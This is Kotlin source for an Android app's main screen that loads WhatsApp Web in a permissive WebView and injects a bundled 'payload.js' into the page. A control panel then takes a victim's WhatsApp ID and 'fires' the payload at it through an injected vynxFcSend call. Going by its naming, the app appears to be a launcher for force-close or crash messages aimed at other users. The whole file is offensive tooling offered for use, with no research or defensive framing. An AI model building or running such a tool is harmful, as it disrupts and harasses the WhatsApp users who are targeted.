package com.vynx.sender

import android.annotation.SuppressLint
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.ConstraintLayout

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var pairingCard: LinearLayout
    private lateinit var pairingCodeText: TextView
    private lateinit var loadingIndicator: LinearLayout
    private lateinit var instructions: LinearLayout
    private lateinit var controlPanel: LinearLayout
    private lateinit var targetInput: EditText
    private lateinit var sendBtn: Button
    private lateinit var statusText: TextView
    private lateinit var connectedDot: View

    private var jsPayload: String = ""
    private var isConnected = false
    private val handler = Handler(Looper.getMainLooper())

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        webView = findViewById(R.id.webview)
        pairingCard = findViewById(R.id.pairing_card)
        pairingCodeText = findViewById(R.id.pairing_code_text)
        loadingIndicator = findViewById(R.id.loading_indicator)
        instructions = findViewById(R.id.instructions)
        controlPanel = findViewById(R.id.control_panel)
        targetInput = findViewById(R.id.target_input)
        sendBtn = findViewById(R.id.send_btn)
        statusText = findViewById(R.id.status_text)
        connectedDot = findViewById(R.id.connected_dot)

        jsPayload = assets.open("payload.js").bufferedReader().use { it.readText() }

        setupWebView()
        setupSendButton()
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            databaseEnabled = true
            setGeolocationEnabled(true)
            userAgentString = "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            javaScriptCanOpenWindowsAutomatically = true
            mediaPlaybackRequiresUserGesture = false
            useWideViewPort = true
            loadWithOverviewMode = true
        }

        webView.addJavascriptInterface(VynxBridge(), "VynxBridge")

        webView.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest?) {
                request?.grant(request.resources)
            }
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                view?.evaluateJavascript(jsPayload, null)
            }

            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                val url = request?.url.toString()
                if (url.contains("whatsapp.com") || url.startsWith("https://web.whatsapp.com")) {
                    return false
                }
                return false
            }

            override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
                // Silently retry
                handler.postDelayed({ webView.reload() }, 2000)
            }
        }

        CookieManager.getInstance().removeAllCookies(null)
        webView.clearCache(true)
        webView.clearHistory()

        webView.loadUrl("https://web.whatsapp.com")
    }

    inner class VynxBridge {
        @JavascriptInterface
        fun onPairingCode(code: String) {
            handler.post {
                if (!isConnected && code.length == 8) {
                    pairingCodeText.text = code
                    loadingIndicator.visibility = View.GONE
                    instructions.visibility = View.VISIBLE
                }
            }
        }

        @JavascriptInterface
        fun onPayloadSent(result: String) {
            handler.post {
                statusText.text = "Payload: $result"
            }
        }

        @JavascriptInterface
        fun onConnected() {
            handler.post {
                isConnected = true
                pairingCard.visibility = View.GONE
                controlPanel.visibility = View.VISIBLE
                statusText.text = "Connected — Ready"
                connectedDot.visibility = View.VISIBLE
            }
        }
    }

    private fun setupSendButton() {
        sendBtn.setOnClickListener {
            val target = targetInput.text.toString().trim()
            if (target.isEmpty()) {
                statusText.text = "Enter target JID first"
                return@setOnClickListener
            }

            if (!target.contains("@s.whatsapp.net")) {
                statusText.text = "Invalid JID format. Use: 62812xxx@s.whatsapp.net"
                return@setOnClickListener
            }

            statusText.text = "Firing payload → $target"

            val injectJS = """
                (function() {
                    if (typeof vynxFcSend === 'function') {
                        vynxFcSend('$target');
                    } else {
                        var script = document.createElement('script');
                        script.textContent = `$jsPayload`;
                        document.head.appendChild(script);
                        setTimeout(function() {
                            if (typeof vynxFcSend === 'function') {
                                vynxFcSend('$target');
                            }
                        }, 1000);
                    }
                })();
            """.trimIndent().replace("`", "\\`")

            webView.evaluateJavascript(injectJS, null)
        }
    }

    // Monitor WebView for connection state via URL changes
    override fun onResume() {
        super.onResume()
        // Periodically check if WA Web has connected (chat list loaded)
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (!isConnected) {
                    webView.evaluateJavascript("""
                        (function() {
                            var chatList = document.querySelector('[data-testid="chat-list"], div#pane-side, div[aria-label="Chat list"]');
                            var header = document.querySelector('header');
                            if (chatList || header) {
                                window.VynxBridge.onConnected();
                            }
                        })();
                    """.trimIndent(), null)
                    handler.postDelayed(this, 2000)
                }
            }
        }, 5000)
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
}
